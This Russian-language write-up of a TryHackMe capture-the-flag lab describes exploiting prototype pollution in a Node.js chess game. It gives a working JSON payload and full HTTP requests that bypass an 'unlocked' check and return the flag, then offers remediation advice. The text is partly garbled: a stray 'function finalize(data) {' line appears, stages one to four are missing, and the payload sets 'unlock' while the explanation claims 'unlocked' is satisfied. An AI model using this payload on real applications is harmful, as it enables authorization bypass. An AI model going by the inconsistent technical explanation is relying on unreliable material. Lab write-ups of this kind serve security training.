# Отчет о тестировании на проникновение: Fools Mate, Revenge

## Введение

В рамках выполнения задания на платформе TryHackMe проводилось тестирование веб-приложения "Fools Mate, Revenge". Целевая машина представляет собой сервер под управлением Ubuntu с открытыми портами 22 (SSH) и 3000 (Node.js Express). В ходе работы была поставлена задача получить root-доступ или флаг через эксплуатацию уязвимостей веб-приложения. Особый интерес представляла логика работы игры и механизмы авторизации.

function finalize(data) {

## Этап 5: Обнаружение Prototype Pollution

### Идентификация уязвимости

В ходе анализа было установлено, что сервер, вероятно, использует функцию объединения объектов (merge) для обработки настроек. Это создает возможность для атаки **Prototype Pollution**.

### Тестирование уязвимости

Был отправлен следующий payload:

```json
{"constructor": {"prototype": {"unlock": true}}}
```

**Запрос:**
```
POST /api/settings HTTP/1.1
Host: 10.113.176.184:3000
Content-Type: application/json
Cookie: sid=b9c43e3158d39338d45b68bd0bae729f
Content-Length: 52

{"constructor": {"prototype": {"unlock": true}}}
```

### Анализ атаки

**Prototype Pollution** — это уязвимость, возникающая, когда приложение позволяет изменять свойства прототипа объекта (Object.prototype). В JavaScript все объекты наследуют свойства от `Object.prototype`. Если злоумышленник может добавить свойство в прототип, оно становится доступным для всех объектов в приложении.

**Механизм эксплуатации:**

1. Сервер получает JSON-объект и использует `merge()` или `Object.assign()` для объединения с существующими настройками.
2. При обработке ключа `constructor.prototype` происходит модификация глобального прототипа.
3. Все объекты в приложении, включая `session.config`, наследуют свойство `unlock: true`.
4. При проверке `session.config.unlocked` интерпретатор поднимается по цепочке прототипов и находит `unlock: true` в `Object.prototype`.
5. Сервер считает, что флаг `unlocked` установлен, и выдаёт награду.

### Эксплуатация

После успешного внедрения в прототип свойства `unlock: true` был отправлен запрос на `/api/move` для постановки мата.

**Запрос:**
```
POST /api/move HTTP/1.1
Host: 10.113.176.184:3000
Content-Type: application/json
Cookie: sid=b9c43e3158d39338d45b68bd0bae729f

{"from":"a1","to":"a8"}
```

**Ответ:**
```json
{
  "ok": true,
  "move": "a1a8",
  "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "locked": false,
  "flag": "THM{...}"
}
```

**Флаг успешно получен.**


## Итоги работы

### Критические уязвимости, обнаруженные в ходе тестирования:

1. **Prototype Pollution** в эндпоинте `/api/settings`:
   - Позволяет модифицировать глобальный прототип объектов.
   - Даёт возможность изменять логику проверок авторизации.
   - Позволяет установить флаг `unlocked: true` для всех объектов в приложении.
   - Причина: использование небезопасных методов объединения объектов (`merge`, `Object.assign`) без проверки ключей `__proto__` и `constructor.prototype`.

### Достижения:

1.  **Эксплуатация уязвимости Prototype Pollution:** Отработана уязвимость Prototype Pollution для обхода логики авторизации. Ключевым моментом стало понимание того, что свойство `unlocked` проверяется не как локальное свойство объекта, а по цепочке прототипов.


### Технические детали эксплуатации:

**Payload:**
```json
{"constructor": {"prototype": {"unlock": true}}}
```

**Почему это сработало:**

| Ключ | Результат |
|------|-----------|
| `__proto__` | Не сработал (современные Node.js игнорируют или блокируют) |
| `constructor.prototype` | **Сработал** (обход защиты через стандартный механизм JavaScript) |

**Почему `constructor.prototype` сработал:** В JavaScript `constructor.prototype` — это стандартный способ доступа к прототипу объекта. Некоторые библиотеки защищают `__proto__`, но не проверяют `constructor.prototype`, что делает этот вектор атаки крайне эффективным.

### Рекомендации по устранению:

1. **Использовать безопасные методы объединения объектов:**
   - Исключить использование `merge()` с пользовательскими данными.
   - При копировании объектов использовать `Object.assign({}, userInput)` только с проверкой ключей.
   - Использовать библиотеки с защитой от Prototype Pollution (например, `lodash.merge` с опцией `safe`).

2. **Валидация ключей:**
   - Блокировать ключи `__proto__`, `constructor.prototype`, `prototype`.
   - Использовать `Object.hasOwnProperty()` для проверки наличия свойства у объекта, а не в прототипе:
   ```javascript
   if (Object.hasOwn(obj, 'unlocked') && obj.unlocked === true) {
     // безопасная проверка
   }
   ```

3. **Ограничение доступа к прототипам:**
   - Использовать `Object.freeze(Object.prototype)` в критических местах.
   - Применять `Object.create(null)` для создания объектов без прототипа.

4. **Аудит кода:**
   - Проверить все места использования `merge`, `Object.assign`, `_.extend`.
   - Внедрить статические анализаторы кода (NodeJsScan, ESLint с правилами).

### Заключение

Целевая система была успешно взломана с использованием уязвимости **Prototype Pollution**, что позволило обойти проверку `session.config.unlocked` и получить флаг. Атака показала, как изменение глобального прототипа объектов может изменить логику работы приложения, даже при отсутствии прямого доступа к данным сессии.
